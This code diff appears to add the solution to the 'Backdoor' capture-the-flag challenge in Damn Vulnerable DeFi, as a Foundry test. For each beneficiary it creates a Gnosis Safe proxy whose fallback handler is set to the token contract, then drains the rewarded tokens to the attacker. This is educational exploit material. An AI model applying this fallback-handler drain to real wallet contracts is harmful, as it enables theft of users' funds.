@@ -7,7 +7,7 @@ import "forge-std/Test.sol";
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {WalletRegistry} from "../../../src/Contracts/backdoor/WalletRegistry.sol";
 import {GnosisSafe} from "gnosis/GnosisSafe.sol";
-import {GnosisSafeProxyFactory} from "gnosis/proxies/GnosisSafeProxyFactory.sol";
+import {GnosisSafeProxyFactory, GnosisSafeProxy} from "gnosis/proxies/GnosisSafeProxyFactory.sol";
 
 contract Backdoor is Test {
     uint256 internal constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;
@@ -79,7 +79,36 @@ contract Backdoor is Test {
         /**
          * EXPLOIT START *
          */
+        for( uint i = 0; i < users.length; i++ ) {
+            // setup wallet beneficiary
+            address[] memory walletOwners = new address[](1);
+            walletOwners[0] = users[i];
 
+            // setup the initializer of the wallet by setting the token as the wallet's `fallbackHandler`
+            // this will allow us to execute calls to the token contract from the wallet without being the owner
+            bytes memory initializer = abi.encodeWithSignature(
+                "setup(address[],uint256,address,bytes,address,address,uint256,address)", 
+                walletOwners,   // _owners
+                1,              // _threshold
+                address(0),     // to
+                "",             // data
+                address(dvt), // fallbackHandler
+                address(0),     // paymentToken
+                0,              // payment
+                address(0)      // paymentReceiver
+            );
+
+            // generate the wallet and call the registry callback
+            GnosisSafeProxy proxy = walletFactory.createProxyWithCallback(address(masterCopy), initializer, 1, walletRegistry);
+
+
+            // use the fallback we setup earlier to directly transfer DVT tokens from the wallet to the attacker!
+            vm.prank(attacker);
+            (bool approveSuccess, ) = address(proxy).call(
+                abi.encodeWithSignature("transfer(address,uint256)", attacker, 10 ether)
+            );
+            assertEq(approveSuccess, true);
+        }
         /**
          * EXPLOIT END *
          */
